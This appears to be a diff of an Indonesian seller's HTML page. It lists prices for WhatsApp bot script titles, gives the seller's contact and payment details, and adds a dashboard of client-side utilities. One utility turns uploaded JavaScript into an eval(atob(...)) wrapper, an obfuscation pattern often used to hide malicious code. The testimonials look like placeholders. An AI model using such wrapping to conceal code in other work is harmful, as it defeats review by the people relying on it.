+              <span class="text-terminal-green font-mono font-bold">250K</span>
+            </div>
+            <ul class="text-xs text-terminal-comment space-y-1">
+              <li>❗ BISA JUALAN SC NIKA</li>
+              <li>❗ FREE UPDATE PERMANEN</li>
+              <li>❗ BISA JUALAN RESELLER</li>
+              <li>❗ BISA JUALAN PARTNER</li>
+              <li>❗ BISA JUALAN TK</li>
+              <li>❗ BISA JUALAN OWNER</li>
+              <li>❗ MASUK GB RESELLER</li>
+              <li>❗ MASUK GRUP PARTNER</li>
+              <li>❗ DAPET BONUS LAINNYA</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+
+      <!-- OPEN UP TITLE NIKA -->
+      <div class="mb-6">
+        <h4 class="text-terminal-purple font-mono font-bold mb-3">OPEN UP TITLE NIKA</h4>
+        
+        <div class="mb-3">
+          <p class="text-xs text-terminal-yellow font-mono mb-2">HARGA UP RESELLER</p>
+          <div class="space-y-1 text-xs font-mono text-terminal-text">
+            <div class="flex justify-between"><span>RESELLER TO PT</span><span class="text-terminal-green">40K</span></div>
+            <div class="flex justify-between"><span>RESELLER TO TK</span><span class="text-terminal-green">80K</span></div>
+            <div class="flex justify-between"><span>RESELLER TO OWNER</span><span class="text-terminal-green">140K</span></div>
+            <div class="flex justify-between"><span>RESELLER TO MODS</span><span class="text-terminal-green">190K</span></div>
+          </div>
+        </div>
+
+        <div class="mb-3">
+          <p class="text-xs text-terminal-yellow font-mono mb-2">HARGA UP PARTNER</p>
+          <div class="space-y-1 text-xs font-mono text-terminal-text">
+            <div class="flex justify-between"><span>PT TO TK</span><span class="text-terminal-green">40K</span></div>
+            <div class="flex justify-between"><span>PT TO OWNER</span><span class="text-terminal-green">80K</span></div>
+            <div class="flex justify-between"><span>PT TO MODS</span><span class="text-terminal-green">150K</span></div>
+          </div>
+        </div>
+
+        <div class="mb-3">
+          <p class="text-xs text-terminal-yellow font-mono mb-2">HARGA UP TK</p>
+          <div class="space-y-1 text-xs font-mono text-terminal-text">
+            <div class="flex justify-between"><span>TK TO OWNER</span><span class="text-terminal-green">60K</span></div>
+            <div class="flex justify-between"><span>TK TO MODS</span><span class="text-terminal-green">110K</span></div>
+          </div>
+        </div>
+
+        <div>
+          <p class="text-xs text-terminal-yellow font-mono mb-2">HARGA UP OWNER</p>
+          <div class="space-y-1 text-xs font-mono text-terminal-text">
+            <div class="flex justify-between"><span>OWNER TO MODS</span><span class="text-terminal-green">50K</span></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- NIKA VIA APK -->
+      <div>
+        <h4 class="text-terminal-green font-mono font-bold mb-3">LIST HARGA NIKA VIA APK</h4>
+        <div class="grid grid-cols-2 gap-2 mb-3">
+          <div class="nika-item text-center"><p class="text-xs text-terminal-comment">1DAY</p><p class="text-terminal-green font-mono font-bold">5K</p></div>
+          <div class="nika-item text-center"><p class="text-xs text-terminal-comment">7DAY</p><p class="text-terminal-green font-mono font-bold">15K</p></div>
+          <div class="nika-item text-center"><p class="text-xs text-terminal-comment">1 BULAN</p><p class="text-terminal-green font-mono font-bold">40K</p></div>
+          <div class="nika-item text-center"><p class="text-xs text-terminal-comment">PERMANEN</p><p class="text-terminal-green font-mono font-bold">55K</p></div>
+          <div class="nika-item text-center"><p class="text-xs text-terminal-comment">RESELLER</p><p class="text-terminal-green font-mono font-bold">90K</p></div>
+          <div class="nika-item text-center"><p class="text-xs text-terminal-comment">ADMIN</p><p class="text-terminal-green font-mono font-bold">120K</p></div>
+          <div class="nika-item text-center col-span-2"><p class="text-xs text-terminal-comment">OWNER</p><p class="text-terminal-green font-mono font-bold">250K</p></div>
+        </div>
+
+        <h4 class="text-terminal-green font-mono font-bold mb-3 mt-4">LIST HARGA UP TITEL APK</h4>
+        <div class="space-y-1 text-xs font-mono text-terminal-text">
+          <div class="flex justify-between"><span>PERMANEN TO RESELLER</span><span class="text-terminal-cyan">50K</span></div>
+          <div class="flex justify-between"><span>PERMANEN TO ADMIN</span><span class="text-terminal-cyan">100K</span></div>
+          <div class="flex justify-between"><span>PERMANEN TO OWNER</span><span class="text-terminal-cyan">220K</span></div>
+          <div class="flex justify-between"><span>RESELLER TO ADMIN</span><span class="text-terminal-cyan">60K</span></div>
+          <div class="flex justify-between"><span>RESELLER TO OWNER</span><span class="text-terminal-cyan">170K</span></div>
+          <div class="flex justify-between"><span>ADMIN TO OWNER</span><span class="text-terminal-cyan">120K</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- PROFILE, SKILLS, PROJECTS, TESTIMONIALS, FAQ, CONTACT, STATS -->
+  <div class="glass-card rounded-xl p-6 max-w-2xl mx-auto mt-8">
+    <div class="flex flex-col items-center mb-8">
+      <div class="relative online-indicator mb-4">
+        <div class="w-32 h-32 rounded-full bg-gradient-to-br from-terminal-cyan to-terminal-purple p-1">
+          <div class="w-full h-full rounded-full bg-terminal-card flex items-center justify-center overflow-hidden">
+            <img src="https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1778864999571.jpeg" class="w-full h-full object-cover"/>
+          </div>
+        </div>
+      </div>
+      <h2 class="text-2xl font-bold mb-2">ASEPXXNX</h2>
+      <p class="text-terminal-comment mb-4">➤ Full Stack Developer</p>
+      <div class="w-full bg-terminal-bg rounded-lg p-4 border-terminal-border mb-6">
+        <div class="text-terminal-yellow text-xs font-semibold mb-2 font-mono">BIO</div>
+        <p class="text-terminal-green italic text-sm">"Gw AsepXxnx, dev script & web. Fokus bikin tools praktis, cepat, dan gampang dipake. Kalau butuh custom project, gas DM."</p>
+      </div>
+      <div class="w-full bg-terminal-darker p-4 rounded border-terminal-border mb-4">
+        <div class="flex items-center justify-between mb-2">
+          <span class="text-xs text-terminal-comment font-mono">Nomor WhatsApp</span>
+          <button onclick="navigator.clipboard.writeText('62881036109288')" class="text-xs text-terminal-green hover:text-terminal-green/80 font-mono">Copy</button>
+        </div>
+        <div class="text-terminal-green font-mono text-lg font-semibold">62881036109288</div>
+      </div>
+      <div class="w-full bg-terminal-darker p-4 rounded border-terminal-border mb-4">
+        <div class="flex items-center justify-between mb-2">
+          <span class="text-xs text-terminal-comment font-mono">Nomor DANA</span>
+          <button onclick="navigator.clipboard.writeText('0882009545852')" class="text-xs text-terminal-cyan hover:text-terminal-cyan/80 font-mono">Copy</button>
+        </div>
+        <div class="text-terminal-cyan font-mono text-lg font-semibold">0882009545852</div>
+        <div class="text-terminal-green text-xs font-mono">a.n: AsepXxnx</div>
+      </div>
+      <div class="w-full bg-terminal-darker p-4 rounded border-terminal-border mb-4">
+        <span class="text-xs text-terminal-comment font-mono mb-2 block">Scan QRIS</span>
+        <img src="https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1778865010448.jpeg" class="w-48 rounded-lg border-terminal-border"/>
+      </div>
+    </div>
+  </div>
+
+  <div class="glass-card rounded-xl p-6 max-w-2xl mx-auto mt-8">
+    <h3 class="text-xl font-bold mb-6 text-center font-mono text-terminal-cyan">SKILLS</h3>
+    <div class="space-y-4">
+      <div><div class="flex justify-between mb-1 text-xs font-mono"><span>JavaScript</span><span>90%</span></div><div class="skill-bar"><div class="skill-fill" style="width: 90%"></div></div></div>
+      <div><div class="flex justify-between mb-1 text-xs font-mono"><span>HTML/CSS</span><span>95%</span></div><div class="skill-bar"><div class="skill-fill" style="width: 95%"></div></div></div>
+      <div><div class="flex justify-between mb-1 text-xs font-mono"><span>Node.js</span><span>85%</span></div><div class="skill-bar"><div class="skill-fill" style="width: 85%"></div></div></div>
+      <div><div class="flex justify-between mb-1 text-xs font-mono"><span>TailwindCSS</span><span>92%</span></div><div class="skill-bar"><div class="skill-fill" style="width: 92%"></div></div></div>
+    </div>
+  </div>
+
+  <div class="glass-card rounded-xl p-6 max-w-4xl mx-auto mt-8">
+    <h3 class="text-xl font-bold mb-6 text-center font-mono text-terminal-purple">PROJECTS</h3>
+    <div class="grid md:grid-cols-2 gap-4">
+      <div class="project-card bg-terminal-darker p-4 rounded-lg border-terminal-border transition-all">
+        <h4 class="font-mono text-terminal-green font-bold mb-2">Bot WhatsApp Nika</h4>
+        <p class="text-xs text-terminal-comment mb-3">Multi-device WA bot dengan fitur auto reply, download, game, dan panel admin.</p>
+        <div class="flex gap-2 text-xs">
+          <span class="px-2 py-1 bg-terminal-purple/20 text-terminal-purple rounded">Node.js</span>
+          <span class="px-2 py-1 bg-terminal-cyan/20 text-terminal-cyan rounded">Baileys</span>
+        </div>
+      </div>
+      <div class="project-card bg-terminal-darker p-4 rounded-lg border-terminal-border transition-all">
+        <h4 class="font-mono text-terminal-green font-bold mb-2">Terminal Portfolio</h4>
+        <p class="text-xs text-terminal-comment mb-3">Portfolio interaktif dengan tema terminal, typing animation, dan media player.</p>
+        <div class="flex gap-2 text-xs">
+          <span class="px-2 py-1 bg-terminal-yellow/20 text-terminal-yellow rounded">HTML</span>
+          <span class="px-2 py-1 bg-terminal-pink/20 text-terminal-pink rounded">Tailwind</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="glass-card rounded-xl p-6 max-w-4xl mx-auto mt-8">
+    <h3 class="text-xl font-bold mb-6 text-center font-mono text-terminal-yellow">TESTIMONIALS</h3>
+    <div class="grid md:grid-cols-3 gap-4">
+      <div class="testimonial-card bg-terminal-darker p-4 rounded-lg border-terminal-border transition-all">
+        <p class="text-xs italic mb-3">"SC nya mantap bro, support fast respon. Recommended!"</p>
+        <p class="text-xs text-terminal-green font-mono">- User A</p>
+      </div>
+      <div class="testimonial-card bg-terminal-darker p-4 rounded-lg border-terminal-border transition-all">
+        <p class="text-xs italic mb-3">"Bot nya stabil, fitur lengkap. Worth it banget."</p>
+        <p class="text-xs text-terminal-green font-mono">- User B</p>
+      </div>
+      <div class="testimonial-card bg-terminal-darker p-4 rounded-lg border-terminal-border transition-all">
+        <p class="text-xs italic mb-3">"Developer nya jujur, gak nipu. Gas terus bang."</p>
+        <p class="text-xs text-terminal-green font-mono">- User C</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="glass-card rounded-xl p-6 max-w-2xl mx-auto mt-8">
+    <h3 class="text-xl font-bold mb-6 text-center font-mono text-terminal-pink">FAQ</h3>
+    <div class="space-y-3">
+      <div class="faq-item bg-terminal-darker p-3 rounded-lg border-terminal-border cursor-pointer" onclick="toggleFAQ(this)">
+        <div class="flex justify-between items-center"><p class="text-xs font-mono">Apakah ada garansi?</p><span class="text-terminal-cyan">+</span></div>
+        <div class="faq-answer"><p class="text-xs text-terminal-comment mt-2">Garansi update permanen selama produk masih aktif dikembangkan.</p></div>
+      </div>
+      <div class="faq-item bg-terminal-darker p-3 rounded-lg border-terminal-border cursor-pointer" onclick="toggleFAQ(this)">
+        <div class="flex justify-between items-center"><p class="text-xs font-mono">Bisa request fitur custom?</p><span class="text-terminal-cyan">+</span></div>
+        <div class="faq-answer"><p class="text-xs text-terminal-comment mt-2">Bisa, kontak aja via WhatsApp. Harga tergantung kompleksitas.</p></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="glass-card rounded-xl p-6 max-w-2xl mx-auto mt-8">
+    <h3 class="text-xl font-bold mb-6 text-center font-mono text-terminal-green">CONTACT ME</h3>
+    <form onsubmit="sendContact(event)" class="space-y-4">
+      <input type="text" id="contactName" placeholder="Nama" required class="w-full px-3 py-2 bg-terminal-darker border-terminal-border rounded text-xs font-mono focus:outline-none focus:border-terminal-green">
+      <input type="email" id="contactEmail" placeholder="Email" required class="w-full px-3 py-2 bg-terminal-darker border-terminal-border rounded text-xs font-mono focus:outline-none focus:border-terminal-green">
+      <textarea id="contactMsg" placeholder="Pesan" rows="4" required class="w-full px-3 py-2 bg-terminal-darker border-terminal-border rounded text-xs font-mono focus:outline-none focus:border-terminal-green"></textarea>
+      <button type="submit" class="w-full py-2 bg-gradient-to-r from-terminal-green to-terminal-cyan text-terminal-darker font-mono font-bold rounded hover:scale-105 transition-all">Kirim Pesan</button>
+    </form>
+  </div>
+
+  <div class="glass-card rounded-xl p-6 max-w-4xl mx-auto mt-8">
+    <h3 class="text-xl font-bold mb-6 text-center font-mono text-terminal-cyan">LIVE STATS</h3>
+    <div class="grid grid-cols-3 gap-4 text-center">
+      <div><div class="text-2xl font-bold text-terminal-green stat-number" id="visitorCount">0</div><p class="text-xs text-terminal-comment font-mono">Visitors</p></div>
+      <div><div class="text-2xl font-bold text-terminal-purple stat-number">15+</div><p class="text-xs text-terminal-comment font-mono">Projects</p></div>
+      <div><div class="text-2xl font-bold text-terminal-yellow stat-number">50+</div><p class="text-xs text-terminal-comment font-mono">Clients</p></div>
+    </div>
+  </div>
+
+  <footer class="mt-12 text-center text-terminal-comment text-sm pb-8">
+    <p class="font-mono">© AsepXxnx using JavaScript & TailwindCSS</p>
+  </footer>
+</main>
+
+<button onclick="scrollToTop()" class="back-to-top p-3 rounded-full bg-terminal-card hover:scale-110 transition-all">
+  <svg class="w-5 h-5 text-terminal-cyan" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 10l7-7m0 0l7 7m-7-7v18"></path>
+  </svg>
+</button>
+</div>
+</main>
+
+<button onclick="scrollToTop()" class="back-to-top p-3 rounded-full bg-terminal-card hover:scale-110 transition-all">
+  <svg class="w-5 h-5 text-terminal-cyan" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 10l7-7m0 0l7 7m-7-7v18"></path>
+  </svg>
+</button>
+</div>
+
+<!-- PAGE 2: TOOLS DASHBOARD -->
+<style>
+.tool-content { display: none !important; }
+.tool-content.active { display: block !important; }
+
+.page { display: none; }
+.page.active { display: block; }
+</style>
+
+<div id="page2" class="page active">
+  <header class="bg-terminal-darker border-b border-terminal-border sticky top-0 z-50">
+    <div class="max-w-7xl mx-auto px-4 py-4 text-center">
+      <h2 class="text-2xl font-mono font-bold bg-gradient-to-r from-terminal-cyan to-terminal-green bg-clip-text text-transparent">punya asep ytm</h2>
+      <p class="text-xs text-terminal-comment font-mono mt-1">22 tools | Client-side | Mobile-friendly</p>
+    </div>
+  </header>
+
+  <main class="max-w-5xl mx-auto px-4 py-8 pb-32">
+
+    <!-- TAB NAV -->
+    <div class="flex gap-2 mb-6 border-b border-terminal-border pb-3 overflow-x-auto">
+      <button onclick="switchTool('obf')" id="tool-obf" class="tool-tab active px-4 py-2 text-xs rounded bg-terminal-cyan text-terminal-darker font-mono whitespace-nowrap">🔒 File Enc</button>
+      <button onclick="switchTool('b64')" id="tool-b64" class="tool-tab px-4 py-2 text-xs rounded bg-terminal-darker text-terminal-comment font-mono whitespace-nowrap">📦 Base64</button>
+      <button onclick="switchTool('json')" id="tool-json" class="tool-tab px-4 py-2 text-xs rounded bg-terminal-darker text-terminal-comment font-mono whitespace-nowrap">📋 JSON</button>
+      <button onclick="switchTool('aes')" id="tool-aes" class="tool-tab px-4 py-2 text-xs rounded bg-terminal-darker text-terminal-comment font-mono whitespace-nowrap">🔐 AES</button>
+      <button onclick="switchTool('hash')" id="tool-hash" class="tool-tab px-4 py-2 text-xs rounded bg-terminal-darker text-terminal-comment font-mono whitespace-nowrap">🧮 Hash</button>
+      <button onclick="switchTool('diff')" id="tool-diff" class="tool-tab px-4 py-2 text-xs rounded bg-terminal-darker text-terminal-comment font-mono whitespace-nowrap">📊 Diff</button>
+      <button onclick="switchTool('regex')" id="tool-regex" class="tool-tab px-4 py-2 text-xs rounded bg-terminal-darker text-terminal-comment font-mono whitespace-nowrap">🔍 Regex</button>
+      <button onclick="switchTool('url')" id="tool-url" class="tool-tab px-4 py-2 text-xs rounded bg-terminal-darker text-terminal-comment font-mono whitespace-nowrap">🔗 URL</button>
+      <button onclick="switchTool('html')" id="tool-html" class="tool-tab px-4 py-2 text-xs rounded bg-terminal-darker text-terminal-comment font-mono whitespace-nowrap">📄 HTML</button>
+      <button onclick="switchTool('case')" id="tool-case" class="tool-tab px-4 py-2 text-xs rounded bg-terminal-darker text-terminal-comment font-mono whitespace-nowrap">🔤 Case</button>
+      <button onclick="switchTool('uuid')" id="tool-uuid" class="tool-tab px-4 py-2 text-xs rounded bg-terminal-darker text-terminal-comment font-mono whitespace-nowrap">🆔 UUID</button>
+      <button onclick="switchTool('time')" id="tool-time" class="tool-tab px-4 py-2 text-xs rounded bg-terminal-darker text-terminal-comment font-mono whitespace-nowrap">⏰ Time</button>
+      <button onclick="switchTool('imgb64')" id="tool-imgb64" class="tool-tab px-4 py-2 text-xs rounded bg-terminal-darker text-terminal-comment font-mono whitespace-nowrap">🖼️ Img B64</button>
+      <button onclick="switchTool('color')" id="tool-color" class="tool-tab px-4 py-2 text-xs rounded bg-terminal-darker text-terminal-comment font-mono whitespace-nowrap">🎨 Color</button>
+      <button onclick="switchTool('qr')" id="tool-qr" class="tool-tab px-4 py-2 text-xs rounded bg-terminal-darker text-terminal-comment font-mono whitespace-nowrap">📱 QR</button>
+      <button onclick="switchTool('ytmeta')" id="tool-ytmeta" class="tool-tab px-4 py-2 text-xs rounded bg-terminal-darker text-terminal-comment font-mono whitespace-nowrap">▶️ YT Meta</button>
+      <button onclick="switchTool('jsontocsv')" id="tool-jsontocsv" class="tool-tab px-4 py-2 text-xs rounded bg-terminal-darker text-terminal-comment font-mono whitespace-nowrap">📊 JSON→CSV</button>
+      <button onclick="switchTool('csvtojson')" id="tool-csvtojson" class="tool-tab px-4 py-2 text-xs rounded bg-terminal-darker text-terminal-comment font-mono whitespace-nowrap">📊 CSV→JSON</button>
+      <button onclick="switchTool('b64imgdl')" id="tool-b64imgdl" class="tool-tab px-4 py-2 text-xs rounded bg-terminal-darker text-terminal-comment font-mono whitespace-nowrap">🖼️ B64 DL</button>
+      <button onclick="switchTool('palette')" id="tool-palette" class="tool-tab px-4 py-2 text-xs rounded bg-terminal-darker text-terminal-comment font-mono whitespace-nowrap">🎨 Palette</button>
+      <button onclick="switchTool('tiktok')" id="tool-tiktok" class="tool-tab px-4 py-2 text-xs rounded bg-terminal-darker text-terminal-comment font-mono whitespace-nowrap">🎵 TikTok</button>
+      <button onclick="switchTool('about')" id="tool-about" class="tool-tab px-4 py-2 text-xs rounded bg-terminal-darker text-terminal-comment font-mono whitespace-nowrap">ℹ️ About</button>
+    </div>
+
+    <!-- TOAST -->
+    <div id="toast" class="fixed top-20 right-4 bg-terminal-green text-terminal-darker px-4 py-2 rounded-lg font-mono text-xs opacity-0 pointer-events-none transition-all z-50">Copied!</div>
+
+    <!-- TOOL 1: FILE ENCRYPTOR -->
+    <div id="content-obf" class="tool-content active">
+      <div class="glass-card rounded-xl p-6">
+        <h3 class="font-mono text-terminal-cyan font-semibold mb-4">🔒 File Encryptor - Base64 + Eval Wrapper</h3>
+        <p class="text-xs text-terminal-comment mb-4">Upload file.js, bakal jadi eval(atob(...)) yang jalan di browser.</p>
+        <div class="file-drop mb-4" id="obfDrop">
+          <input type="file" id="obfFile" accept=".js,.html,.txt,.css,.json" class="hidden">
+          <div id="obfDropText">
+            <p class="text-terminal-cyan font-mono text-sm mb-1">📁 Upload file.js/.html/.txt</p>
+            <p class="text-terminal-comment text-xs">Max 5MB</p>
+          </div>
+        </div>
+        <div class="grid grid-cols-2 gap-2 mb-3">
+          <button onclick="encryptFile()" class="py-2 bg-terminal-cyan text-terminal-darker font-mono font-bold rounded text-sm">🔒 Encrypt</button>
+          <button onclick="decryptFile()" class="py-2 bg-terminal-yellow text-terminal-darker font-mono font-bold rounded text-sm">🔓 Decrypt</button>
+          <button onclick="downloadEncrypted()" class="py-2 bg-terminal-green text-terminal-darker font-mono font-bold rounded text-sm">💾 Download</button>
+          <button onclick="clearTool('obfInput','obfOutput')" class="py-2 bg-terminal-red text-terminal-darker font-mono font-bold rounded text-sm">🗑️ Clear</button>
+        </div>
+        <textarea id="obfInput" readonly placeholder="Upload file dulu..." class="w-full h-32 px-3 py-2 bg-terminal-darker border-terminal-border rounded text-xs font-mono mb-3"></textarea>
+        <textarea id="obfOutput" readonly placeholder="Hasil encrypt muncul disini..." class="w-full h-32 px-3 py-2 bg-terminal-darker border-terminal-border rounded text-xs font-mono"></textarea>
+        <p class="text-xs text-terminal-comment mt-2" id="obfStats">0 chars</p>
+      </div>
+    </div>
+
+    <!-- TOOL 2: BASE64 -->
+    <div id="content-b64" class="tool-content">
+      <div class="glass-card rounded-xl p-6">
+        <h3 class="font-mono text-terminal-green font-semibold mb-4">Base64 Text Encoder/Decoder</h3>
+        <div class="flex gap-2 mb-3">
+          <label class="flex-1 px-3 py-2 bg-terminal-darker border-terminal-border rounded text-xs font-mono text-terminal-cyan cursor-pointer hover:border-terminal-cyan text-center">
+            📁 Upload.txt
+            <input type="file" id="b64File" accept=".txt" class="hidden">
+          </label>
+          <button onclick="clearTool('b64Input','b64Output')" class="px-4 py-2 bg-terminal-red text-terminal-darker font-mono font-bold rounded text-xs">🗑️ Clear</button>
+        </div>
+        <textarea id="b64Input" placeholder="Text/Emoji/Unicode aman" class="w-full h-32 px-3 py-2 bg-terminal-darker border-terminal-border rounded text-xs font-mono mb-3"></textarea>
+        <div class="grid grid-cols-2 gap-2">
+          <button onclick="encodeB64()" class="py-2 bg-terminal-green text-terminal-darker font-mono font-bold rounded">Encode</button>
+          <button onclick="decodeB64()" class="py-2 bg-terminal-yellow text-terminal-darker font-mono font-bold rounded">Decode</button>
+          <button onclick="copyResult('b64Output')" class="py-2 bg-terminal-purple text-terminal-darker font-mono font-bold rounded">Copy</button>
+          <button onclick="downloadResult('b64Output','base64.txt')" class="py-2 bg-terminal-cyan text-terminal-darker font-mono font-bold rounded">Download</button>
+        </div>
+        <textarea id="b64Output" readonly class="w-full h-32 px-3 py-2 bg-terminal-darker border-terminal-border rounded text-xs font-mono mt-3"></textarea>
+      </div>
+    </div>
+
+    <!-- TOOL 3: JSON -->
+    <div id="content-json" class="tool-content">
+      <div class="glass-card rounded-xl p-6">
+        <h3 class="font-mono text-terminal-purple font-semibold mb-4">JSON Formatter & Validator</h3>
+        <textarea id="jsonInput" placeholder='{"key":"value"}' class="w-full h-32 px-3 py-2 bg-terminal-darker border-terminal-border rounded text-xs font-mono mb-3"></textarea>
+        <div class="grid grid-cols-3 gap-2">
+          <button onclick="formatJSON()" class="py-2 bg-terminal-purple text-terminal-darker font-mono font-bold rounded text-xs">Format</button>
+          <button onclick="minifyJSON()" class="py-2 bg-terminal-pink text-terminal-darker font-mono font-bold rounded text-xs">Minify</button>
+          <button onclick="validateJSON()" class="py-2 bg-terminal-green text-terminal-darker font-mono font-bold rounded text-xs">Validate</button>
+        </div>
+        <textarea id="jsonOutput" readonly class="w-full h-32 px-3 py-2 bg-terminal-darker border-terminal-border rounded text-xs font-mono mt-3"></textarea>
+      </div>
+    </div>
+
+    <!-- TOOL 4: AES -->
+    <div id="content-aes" class="tool-content">
+      <div class="glass-card rounded-xl p-6">
+        <h3 class="font-mono text-terminal-yellow font-semibold mb-4">AES-256 Encrypt/Decrypt</h3>
+        <input type="password" id="aesKey" placeholder="Secret Key" class="w-full px-3 py-2 bg-terminal-darker border-terminal-border rounded text-xs font-mono mb-3">
+        <textarea id="aesInput" placeholder="Text disini..." class="w-full h-32 px-3 py-2 bg-terminal-darker border-terminal-border rounded text-xs font-mono mb-3"></textarea>
+        <div class="grid grid-cols-2 gap-2">
+          <button onclick="aesEncrypt()" class="py-2 bg-terminal-yellow text-terminal-darker font-mono font-bold rounded">Encrypt</button>
+          <button onclick="aesDecrypt()" class="py-2 bg-terminal-red text-terminal-darker font-mono font-bold rounded">Decrypt</button>
+        </div>
+        <textarea id="aesOutput" readonly class="w-full h-32 px-3 py-2 bg-terminal-darker border-terminal-border rounded text-xs font-mono mt-3"></textarea>
+      </div>
+    </div>
+
+    <!-- TOOL 5: HASH -->
+    <div id="content-hash" class="tool-content">
+      <div class="glass-card rounded-xl p-6">
+        <h3 class="font-mono text-terminal-pink font-semibold mb-4">Hash Generator</h3>
+        <textarea id="hashInput" placeholder="Text disini..." class="w-full h-24 px-3 py-2 bg-terminal-darker border-terminal-border rounded text-xs font-mono mb-3"></textarea>
+        <button onclick="generateHash()" class="w-full py-2 bg-terminal-pink text-terminal-darker font-mono font-bold rounded mb-3">Generate All Hash</button>
+        <div class="space-y-2">
+          <div class="bg-terminal-darker p-3 rounded"><p class="text-xs text-terminal-comment">MD5</p><p id="md5Out" class="text-xs font-mono break-all">-</p></div>
+          <div class="bg-terminal-darker p-3 rounded"><p class="text-xs text-terminal-comment">SHA256</p><p id="sha256Out" class="text-xs font-mono break-all">-</p></div>
+          <div class="bg-terminal-darker p-3 rounded"><p class="text-xs text-terminal-comment">SHA512</p><p id="sha512Out" class="text-xs font-mono break-all">-</p></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- TOOL 6: DIFF -->
+    <div id="content-diff" class="tool-content">
+      <div class="glass-card rounded-xl p-6">
+        <h3 class="font-mono text-terminal-cyan font-semibold mb-4">Text Diff Checker</h3>
+        <textarea id="diff1" placeholder="Text 1" class="w-full h-32 px-3 py-2 bg-terminal-darker border-terminal-border rounded text-xs font-mono mb-2"></textarea>
+        <textarea id="diff2" placeholder="Text 2" class="w-full h-32 px-3 py-2 bg-terminal-darker border-terminal-border rounded text-xs font-mono mb-2"></textarea>
+        <div class="grid grid-cols-2 gap-2 mb-3">
+          <button onclick="compareDiff()" class="py-2 bg-terminal-cyan text-terminal-darker font-mono font-bold rounded">Compare</button>
+          <button onclick="clearTool('diff1','diff2','diffOut')" class="py-2 bg-terminal-red text-terminal-darker font-mono font-bold rounded">Clear</button>
+        </div>
+        <pre id="diffOut" class="p-3 bg-terminal-darker rounded text-xs font-mono overflow-x-auto max-h-60"></pre>
+      </div>
+    </div>
+
+    <!-- TOOL 7: REGEX -->
+    <div id="content-regex" class="tool-content">
+      <div class="glass-card rounded-xl p-6">
+        <h3 class="font-mono text-terminal-green font-semibold mb-4">Regex Tester</h3>
+        <input type="text" id="regexPattern" placeholder="Pattern: \d+" class="w-full px-3 py-2 bg-terminal-darker border-terminal-border rounded text-xs font-mono mb-2">
+        <input type="text" id="regexFlags" placeholder="Flags: gim" class="w-full px-3 py-2 bg-terminal-darker border-terminal-border rounded text-xs font-mono mb-3">
+        <textarea id="regexTest" placeholder="Test string" class="w-full h-24 px-3 py-2 bg-terminal-darker border-terminal-border rounded text-xs font-mono mb-3"></textarea>
+        <div class="grid grid-cols-2 gap-2 mb-3">
+          <button onclick="testRegex()" class="py-2 bg-terminal-green text-terminal-darker font-mono font-bold rounded">Test Regex</button>
+          <button onclick="clearTool('regexPattern','regexFlags','regexTest','regexResult')" class="py-2 bg-terminal-red text-terminal-darker font-mono font-bold rounded">Clear</button>
+        </div>
+        <div id="regexResult" class="p-3 bg-terminal-darker rounded text-xs font-mono"></div>
+      </div>
+    </div>
+
+    <!-- TOOL 8: URL -->
+    <div id="content-url" class="tool-content">
+      <div class="glass-card rounded-xl p-6">
+        <h3 class="font-mono text-terminal-cyan font-semibold mb-4">URL Encode/Decode</h3>
+        <textarea id="urlInput" placeholder="Text/URL disini..." class="w-full h-32 px-3 py-2 bg-terminal-darker border-terminal-border rounded text-xs font-mono mb-3"></textarea>
+        <div class="grid grid-cols-2 gap-2">
+          <button onclick="encodeURL()" class="py-2 bg-terminal-cyan text-terminal-darker font-mono font-bold rounded">Encode</button>
+          <button onclick="decodeURL()" class="py-2 bg-terminal-yellow text-terminal-darker font-mono font-bold rounded">Decode</button>
+        </div>
+        <textarea id="urlOutput" readonly class="w-full h-32 px-3 py-2 bg-terminal-darker border-terminal-border rounded text-xs font-mono mt-3"></textarea>
+      </div>
+    </div>
+
+    <!-- TOOL 9: HTML ESCAPE -->
+    <div id="content-html" class="tool-content">
+      <div class="glass-card rounded-xl p-6">
+        <h3 class="font-mono text-terminal-purple font-semibold mb-4">HTML Escape/Unescape</h3>
+        <textarea id="htmlInput" placeholder="&lt;div&gt;Hello&lt;/div&gt;" class="w-full h-32 px-3 py-2 bg-terminal-darker border-terminal-border rounded text-xs font-mono mb-3"></textarea>
+        <div class="grid grid-cols-2 gap-2">
+          <button onclick="escapeHTML()" class="py-2 bg-terminal-purple text-terminal-darker font-mono font-bold rounded">Escape</button>
+          <button onclick="unescapeHTML()" class="py-2 bg-terminal-yellow text-terminal-darker font-mono font-bold rounded">Unescape</button>
+        </div>
+        <textarea id="htmlOutput" readonly class="w-full h-32 px-3 py-2 bg-terminal-darker border-terminal-border rounded text-xs font-mono mt-3"></textarea>
+      </div>
+    </div>
+
+    <!-- TOOL 10: CASE CONVERTER -->
+    <div id="content-case" class="tool-content">
+      <div class="glass-card rounded-xl p-6">
+        <h3 class="font-mono text-terminal-green font-semibold mb-4">String Case Converter</h3>
+        <textarea id="caseInput" placeholder="hello world test" class="w-full h-24 px-3 py-2 bg-terminal-darker border-terminal-border rounded text-xs font-mono mb-3"></textarea>
+        <div class="grid grid-cols-3 gap-2">
+          <button onclick="toUpperCase()" class="py-2 bg-terminal-green text-terminal-darker font-mono font-bold rounded text-xs">UPPER</button>
+          <button onclick="toLowerCase()" class="py-2 bg-terminal-green text-terminal-darker font-mono font-bold rounded text-xs">lower</button>
+          <button onclick="toTitleCase()" class="py-2 bg-terminal-green text-terminal-darker font-mono font-bold rounded text-xs">Title</button>
+          <button onclick="toCamelCase()" class="py-2 bg-terminal-green text-terminal-darker font-mono font-bold rounded text-xs">camel</button>
+          <button onclick="toSnakeCase()" class="py-2 bg-terminal-green text-terminal-darker font-mono font-bold rounded text-xs">snake</button>
+          <button onclick="toKebabCase()" class="py-2 bg-terminal-green text-terminal-darker font-mono font-bold rounded text-xs">kebab</button>
+        </div>
